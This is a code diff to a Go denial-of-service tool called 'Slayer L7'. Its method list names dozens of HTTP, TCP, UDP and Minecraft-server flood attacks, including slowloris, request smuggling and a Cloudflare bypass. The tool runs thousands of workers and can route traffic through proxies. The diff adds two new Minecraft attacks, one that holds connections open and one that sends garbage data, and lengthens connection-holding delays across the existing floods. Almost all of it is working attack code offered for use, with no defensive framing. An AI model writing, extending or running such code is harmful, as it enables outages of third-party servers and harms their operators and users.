@@ -1998,7 +1998,7 @@ func mcPingFlood(targetURL string, stop <-chan struct{}) error {
             return err
         }
     } else {
-        conn, err = net.DialTimeout("tcp", addr, 5*time.Second)
+        conn, err = net.DialTimeout("tcp", addr, 15*time.Second)
         if err != nil {
             recordStatus("Err")
             return err
@@ -2035,6 +2035,7 @@ func mcPingFlood(targetURL string, stop <-chan struct{}) error {
     conn.SetReadDeadline(time.Now().Add(2 * time.Second))
     conn.Read(buf)
 
+    time.Sleep(time.Duration(10+rand.Intn(5)) * time.Second)
     recordStatus("Sent")
     return nil
 }
@@ -2066,7 +2067,7 @@ func mcBotJoin(targetURL string, stop <-chan struct{}) error {
             return err
         }
     } else {
-        conn, err = net.DialTimeout("tcp", addr, 5*time.Second)
+        conn, err = net.DialTimeout("tcp", addr, 15*time.Second)
         if err != nil {
             recordStatus("Err")
             return err
@@ -2102,6 +2103,7 @@ func mcBotJoin(targetURL string, stop <-chan struct{}) error {
     conn.SetReadDeadline(time.Now().Add(5 * time.Second))
     conn.Read(buf)
 
+    time.Sleep(time.Duration(15+rand.Intn(15)) * time.Second)
     recordStatus("Sent")
     return nil
 }
@@ -2133,7 +2135,7 @@ func mcBigPacket(targetURL string, stop <-chan struct{}) error {
             return err
         }
     } else {
-        conn, err = net.DialTimeout("tcp", addr, 5*time.Second)
+        conn, err = net.DialTimeout("tcp", addr, 15*time.Second)
         if err != nil {
             recordStatus("Err")
             return err
@@ -2162,6 +2164,7 @@ func mcBigPacket(targetURL string, stop <-chan struct{}) error {
     rand.Read(smallPayload)
     conn.Write(smallPayload)
 
+    time.Sleep(time.Duration(10+rand.Intn(5)) * time.Second)
     recordStatus("Sent")
     return nil
 }
@@ -2193,7 +2196,7 @@ func mcLegacyPing(targetURL string, stop <-chan struct{}) error {
             return err
         }
     } else {
-        conn, err = net.DialTimeout("tcp", addr, 5*time.Second)
+        conn, err = net.DialTimeout("tcp", addr, 15*time.Second)
         if err != nil {
             recordStatus("Err")
             return err
@@ -2212,6 +2215,7 @@ func mcLegacyPing(targetURL string, stop <-chan struct{}) error {
     conn.SetReadDeadline(time.Now().Add(2 * time.Second))
     conn.Read(buf)
 
+    time.Sleep(time.Duration(10+rand.Intn(5)) * time.Second)
     recordStatus("Sent")
     return nil
 }
@@ -2243,7 +2247,7 @@ func mcNullPing(targetURL string, stop <-chan struct{}) error {
             return err
         }
     } else {
-        conn, err = net.DialTimeout("tcp", addr, 5*time.Second)
+        conn, err = net.DialTimeout("tcp", addr, 15*time.Second)
         if err != nil {
             recordStatus("Err")
             return err
@@ -2275,7 +2279,7 @@ func mcNullPing(targetURL string, stop <-chan struct{}) error {
         return err
     }
 
-    time.Sleep(time.Duration(10+rand.Intn(5)) * time.Second)
+    time.Sleep(time.Duration(15+rand.Intn(15)) * time.Second)
 
     recordStatus("Sent")
     return nil
@@ -2308,7 +2312,7 @@ func mcHandshakeFlood(targetURL string, stop <-chan struct{}) error {
             return err
         }
     } else {
-        conn, err = net.DialTimeout("tcp", addr, 5*time.Second)
+        conn, err = net.DialTimeout("tcp", addr, 15*time.Second)
         if err != nil {
             recordStatus("Err")
             return err
@@ -2337,6 +2341,142 @@ func mcHandshakeFlood(targetURL string, stop <-chan struct{}) error {
         }
     }
 
+    time.Sleep(time.Duration(10+rand.Intn(5)) * time.Second)
+    recordStatus("Sent")
+    return nil
+}
+
+func mcHold(targetURL string, stop <-chan struct{}) error {
+    u, err := url.Parse(targetURL)
+    if err != nil {
+        recordStatus("Err")
+        return err
+    }
+    host := u.Hostname()
+    port := u.Port()
+    if port == "" {
+        port = "25565"
+    }
+    addr := net.JoinHostPort(host, port)
+
+    var conn net.Conn
+    if len(proxyList) > 0 {
+        proxy := proxyList[rand.Intn(len(proxyList))]
+        pURL, err := url.Parse(proxy)
+        if err != nil {
+            recordStatus("Err")
+            return err
+        }
+        conn, err = dialViaProxy("tcp", addr, pURL)
+        if err != nil {
+            recordStatus("Err")
+            return err
+        }
+    } else {
+        conn, err = net.DialTimeout("tcp", addr, 15*time.Second)
+        if err != nil {
+            recordStatus("Err")
+            return err
+        }
+    }
+    defer conn.Close()
+
+    hostLen := len(host)
+    handshake := []byte{0x00, 0xFF, 0xFF, 0xFF, 0x0F, 0x00, byte(hostLen)}
+    handshake = append(handshake, []byte(host)...)
+    portInt, _ := strconv.Atoi(port)
+    portBytes := []byte{byte(portInt >> 8), byte(portInt)}
+    handshake = append(handshake, portBytes...)
+    handshake = append(handshake, 0x01)
+
+    pktLen := len(handshake)
+    packet := []byte{byte(pktLen)}
+    packet = append(packet, handshake...)
+
+    _, err = conn.Write(packet)
+    if err != nil {
+        recordStatus("Err")
+        return err
+    }
+
+    _, err = conn.Write([]byte{0x01, 0x00})
+    if err != nil {
+        recordStatus("Err")
+        return err
+    }
+
+    buf := make([]byte, 4096)
+    conn.SetReadDeadline(time.Now().Add(5 * time.Second))
+    conn.Read(buf)
+
+    time.Sleep(time.Duration(30+rand.Intn(30)) * time.Second)
+
+    recordStatus("Sent")
+    return nil
+}
+
+func mcData(targetURL string, stop <-chan struct{}) error {
+    u, err := url.Parse(targetURL)
+    if err != nil {
+        recordStatus("Err")
+        return err
+    }
+    host := u.Hostname()
+    port := u.Port()
+    if port == "" {
+        port = "25565"
+    }
+    addr := net.JoinHostPort(host, port)
+
+    var conn net.Conn
+    if len(proxyList) > 0 {
+        proxy := proxyList[rand.Intn(len(proxyList))]
+        pURL, err := url.Parse(proxy)
+        if err != nil {
+            recordStatus("Err")
+            return err
+        }
+        conn, err = dialViaProxy("tcp", addr, pURL)
+        if err != nil {
+            recordStatus("Err")
+            return err
+        }
+    } else {
+        conn, err = net.DialTimeout("tcp", addr, 15*time.Second)
+        if err != nil {
+            recordStatus("Err")
+            return err
+        }
+    }
+    defer conn.Close()
+
+    hostLen := len(host)
+    handshake := []byte{0x00, 0xFF, 0xFF, 0xFF, 0x0F, 0x00, byte(hostLen)}
+    handshake = append(handshake, []byte(host)...)
+    portInt, _ := strconv.Atoi(port)
+    portBytes := []byte{byte(portInt >> 8), byte(portInt)}
+    handshake = append(handshake, portBytes...)
+    handshake = append(handshake, 0x02)
+
+    pktLen := len(handshake)
+    packet := []byte{byte(pktLen)}
+    packet = append(packet, handshake...)
+
+    _, err = conn.Write(packet)
+    if err != nil {
+        recordStatus("Err")
+        return err
+    }
+
+    garbage := make([]byte, 256)
+    rand.Read(garbage)
+    _, err = conn.Write(garbage)
+    if err != nil {
+        recordStatus("Err")
+        return err
+    }
+
+    time.Sleep(time.Duration(10+rand.Intn(5)) * time.Second)
     recordStatus("Sent")
     return nil
 }
@@ -2414,6 +2554,10 @@ func Worker(id int, targetURL string, method string, clients []*http.Client, sto
             err = mcNullPing(targetURL, stop)
         case "mc_handshake_flood":
             err = mcHandshakeFlood(targetURL, stop)
+        case "mc_hold":
+            err = mcHold(targetURL, stop)
+        case "mc_data":
+            err = mcData(targetURL, stop)
         default:
             fmt.Fprintf(os.Stderr, "\n  unknown method: %s\n", method)
             os.Exit(1)
@@ -2431,7 +2575,7 @@ func Worker(id int, targetURL string, method string, clients []*http.Client, sto
 
 func main() {
     target := flag.String("t", "", "target URL (e.g. http://1.2.3.4)")
-    method := flag.String("m", "httpget", "method: httpget, httppost, rudy, apiflood, rapidreset, wsflood, slowloris, headerflood, mixpost, cfbypass, range, cookiebomb, chunkpost, malformed, h2continuation, graphql_batch, zstd_bomb, redos, cache_poison, smuggle_clte, pingback, tcp_connect, tcp_slow, tcp_payload, udp_flood, mc_ping, mc_bot, mc_bigpacket, mc_legacy, mc_nullping, mc_handshake_flood")
+    method := flag.String("m", "httpget", "method: httpget, httppost, rudy, apiflood, rapidreset, wsflood, slowloris, headerflood, mixpost, cfbypass, range, cookiebomb, chunkpost, malformed, h2continuation, graphql_batch, zstd_bomb, redos, cache_poison, smuggle_clte, pingback, tcp_connect, tcp_slow, tcp_payload, udp_flood, mc_ping, mc_bot, mc_bigpacket, mc_legacy, mc_nullping, mc_handshake_flood, mc_hold, mc_data")
     workerCount := flag.Int("w", 2048, "number of workers")
     dur := flag.Int("d", 30, "duration in seconds")
     pFile := flag.String("p", "", "proxy file path (optional, direct if omitted)")
@@ -2442,7 +2586,7 @@ func main() {
     if *target == "" {
         fmt.Println("Slayer L7")
         fmt.Println("\n  Usage: slayer -t <url> [-m method] [-w workers] [-d duration] [-p proxyfile]")
-        fmt.Println("  Methods: httpget | httppost | rudy | apiflood | rapidreset | wsflood | slowloris | headerflood | mixpost | cfbypass | range | cookiebomb | chunkpost | malformed | h2continuation | graphql_batch | zstd_bomb | redos | cache_poison | smuggle_clte | pingback | tcp_connect | tcp_slow | tcp_payload | udp_flood | mc_ping | mc_bot | mc_bigpacket | mc_legacy | mc_nullping | mc_handshake_flood")
+        fmt.Println("  Methods: httpget | httppost | rudy | apiflood | rapidreset | wsflood | slowloris | headerflood | mixpost | cfbypass | range | cookiebomb | chunkpost | malformed | h2continuation | graphql_batch | zstd_bomb | redos | cache_poison | smuggle_clte | pingback | tcp_connect | tcp_slow | tcp_payload | udp_flood | mc_ping | mc_bot | mc_bigpacket | mc_legacy | mc_nullping | mc_handshake_flood | mc_hold | mc_data")
         fmt.Println()
         flag.PrintDefaults()
         os.Exit(1)
@@ -2458,7 +2602,7 @@ func main() {
         "slowloris": true, "headerflood": true, "mixpost": true, "cfbypass": true, "range": true, "cookiebomb": true,
         "chunkpost": true, "malformed": true, "h2continuation": true, "graphql_batch": true, "zstd_bomb": true,
         "redos": true, "cache_poison": true, "smuggle_clte": true, "pingback": true, "tcp_connect": true, "tcp_slow": true, "tcp_payload": true, "udp_flood": true,
-        "mc_ping": true, "mc_bot": true, "mc_bigpacket": true, "mc_legacy": true, "mc_nullping": true, "mc_handshake_flood": true,
+        "mc_ping": true, "mc_bot": true, "mc_bigpacket": true, "mc_legacy": true, "mc_nullping": true, "mc_handshake_flood": true, "mc_hold": true, "mc_data": true,
     }
     if !validMethods[strings.ToLower(*method)] {
         fmt.Fprintf(os.Stderr, "\n  \033[31m✗\033[0m Unknown method: %s\n", *method)
@@ -2467,7 +2611,7 @@ func main() {
 
     needsClientPool := true
     switch strings.ToLower(*method) {
-    case "rapidreset", "wsflood", "slowloris", "malformed", "h2continuation", "smuggle_clte", "tcp_connect", "tcp_slow", "tcp_payload", "udp_flood", "mc_ping", "mc_bot", "mc_bigpacket", "mc_legacy", "mc_nullping", "mc_handshake_flood":
+    case "rapidreset", "wsflood", "slowloris", "malformed", "h2continuation", "smuggle_clte", "tcp_connect", "tcp_slow", "tcp_payload", "udp_flood", "mc_ping", "mc_bot", "mc_bigpacket", "mc_legacy", "mc_nullping", "mc_handshake_flood", "mc_hold", "mc_data":
         needsClientPool = false
     }
 
